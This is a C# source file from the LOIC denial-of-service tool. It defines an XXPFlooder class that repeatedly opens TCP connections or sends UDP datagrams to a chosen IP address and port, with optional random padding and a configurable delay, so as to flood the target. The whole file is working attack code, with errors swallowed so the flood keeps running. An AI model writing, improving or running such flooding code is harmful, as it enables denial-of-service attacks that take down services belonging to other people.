using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;

namespace LOIC
{
	public class XXPFlooder
	{
		public bool IsFlooding;
		public int FloodCount;
		public string IP;
		public int Port;
		public int Protocol;
		public int Delay;
		public bool Resp;
		public string Data;
		private readonly bool AllowRandom;

		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
		{
			this.IP = ip;
			this.Port = port;
			this.Protocol = proto;
			this.Delay = delay;
			this.Resp = resp;
			this.Data = data;
			this.AllowRandom = random;
		}
		public void Start()
		{
			IsFlooding = true;
			BackgroundWorker bw = new BackgroundWorker();
			bw.DoWork += bw_DoWork;
			bw.RunWorkerAsync();
		}
		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
				while (IsFlooding)
				{
					Socket socket = null;
					if(Protocol == 1)
					{
						using (socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
						{
							socket.NoDelay = true;

							try { socket.Connect(RHost); }
							catch { continue; }

							socket.Blocking = Resp;
							try
							{
								while (IsFlooding)
								{
									FloodCount++;
									byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
									socket.Send(buf);
									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
								}
							}
							// Analysis disable once EmptyGeneralCatchClause
							catch { }
						}
					}
					if(Protocol == 2)
					{
						using (socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
						{
							socket.NoDelay = true;
							socket.Blocking = Resp;
							try
							{
								while (IsFlooding)
								{
									FloodCount++;
									byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
									socket.SendTo(buf, SocketFlags.None, RHost);
									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
								}
							}
							// Analysis disable once EmptyGeneralCatchClause
							catch { }
						}
					}
				}
			}
			// Analysis disable once EmptyGeneralCatchClause
			catch { }
		}
	}
}